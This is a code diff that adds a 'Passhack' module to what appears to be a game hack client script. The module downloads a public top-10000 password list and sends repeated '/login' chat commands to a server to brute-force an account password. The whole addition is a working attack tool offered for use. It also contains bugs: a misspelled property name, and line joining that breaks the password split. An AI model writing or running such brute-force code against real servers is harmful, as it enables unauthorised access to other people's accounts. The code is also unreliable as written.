@@ -3187,6 +3187,75 @@ var autowalk = {
 	}
 };
 DragOP.registerModule(autowalk);
+var passhack = {
+	name: "Passhack",
+	desc: "Tries to crack a password.",
+	type: ModuleType.mod,
+	state: false,
+	lastTime: 0,
+	delay: 100,
+	loginPatter: "/login {password}",
+	passes: null,
+	usedPasses: 0,
+	downloadPasses: function(){
+		var r = new java.lang.Runnable({
+			run: function() {
+				try {
+					var u = new java.net.URL("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_10000.txt");
+					var allCont = new java.lang.StringBuilder();
+					var reader = new java.io.BufferedReader(new java.io.InputStreamReader(u.openStream()));
+					var line = "";
+					while ((line = reader.readLine()) != null) {
+						allCont.append(line);
+					}
+					reader.close();
+					passhack.passes = allCont.toString().split("\n");
+					DragOP.ctoast("Done! "+allCont.length);
+
+				} catch (e) {
+					DragOP.ctoast("Pass-DL-Error: "+e);
+				}
+			}
+		});
+		var th = new java.lang.Thread(r);
+		th.start();
+	},
+	isStateMode: function () {
+		return true; //For Menu Button Color (green = enabled, black(alpha:210) = disabled)
+		//Call hack.state = !hack.state; to toggle 
+	},
+	isToggleAble: function () {
+		return true; //MUST be true if isStateMode = true
+		//Call hack.onClick() to toggle
+	},
+	onTick: function () {
+		if(!this.state || this.passes == null)
+			return
+		if(java.lang.System.currentTimeMillis() - this.lastTime > this.delay){
+			var password = this.passes[this.usedPasses];
+			this.usedPasses++;
+			Server.sendChat(this.loginPattern.replace(new RegExp("{password}", 'g'), password));
+			DragOP.cmsg("Tried the "+this.usedPasses+"th password \""+password+"\"");
+			this.lastTime = java.lang.System.currentTimeMillis();
+		}
+	},
+	onClick: function (btn) {
+		this.state = !this.state;
+		this.usedPasses = 0;
+		if(this.state == true)
+			if(this.passes == null){
+				DragOP.ctoast("Password list not downloaded yet.\nTrying to download it...");
+				this.state = false;
+				this.downloadPasses();
+			}
+				
+	},
+	onRefresh: function (btn) {
+		if(btn != null)btn.setText(this.name);
+	}
+};
+passhack.downloadPasses();
+DragOP.registerModule(passhack);
 /*
 var statehack = {
 	name: "Hack",
